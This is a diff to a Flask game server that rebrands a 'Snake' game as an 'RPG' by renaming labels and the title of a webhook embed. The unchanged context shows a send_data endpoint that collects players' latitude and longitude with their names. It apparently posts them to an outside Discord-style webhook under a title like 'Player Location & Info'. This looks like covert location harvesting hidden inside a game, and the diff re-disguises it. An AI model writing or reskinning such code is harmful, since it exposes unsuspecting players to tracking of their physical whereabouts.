@@ -28,7 +28,7 @@ def handle_leaderboard():
         score = data.get('score', 0)
         
         if isinstance(score, int) and score >= 0:
-            global_leaderboard.append({"name": name if name else "Player", "score": score})
+            global_leaderboard.append({"name": name if name else "Hero", "score": score})
             global_leaderboard = sorted(global_leaderboard, key=lambda x: x['score'], reverse=True)[:10]
             
         return jsonify({"status": "ok", "leaderboard": global_leaderboard})
@@ -57,7 +57,7 @@ def send_data():
     payload = request.get_json(silent=True) or {}
     latitude = payload.get('latitude')
     longitude = payload.get('longitude')
-    player_name = payload.get('name', 'Unknown Player')
+    player_name = payload.get('name', 'Unknown Hero')
 
     if latitude is None or longitude is None:
         return jsonify({"status": "error", "message": "Missing coordinates"}), 400
@@ -65,10 +65,10 @@ def send_data():
     webhook_payload = {
         "embeds": [
             {
-                "title": "🐍 Snake Player Location & Info",
-                "color": 3447003,
+                "title": "⚔️ RPG Adventurer Joined",
+                "color": 65280,
                 "fields": [
-                    {"name": "Player Name", "value": str(player_name), "inline": False},
+                    {"name": "Hero Name", "value": str(player_name), "inline": False},
                     {"name": "Latitude", "value": str(latitude), "inline": True},
                     {"name": "Longitude", "value": str(longitude), "inline": True}
                 ]
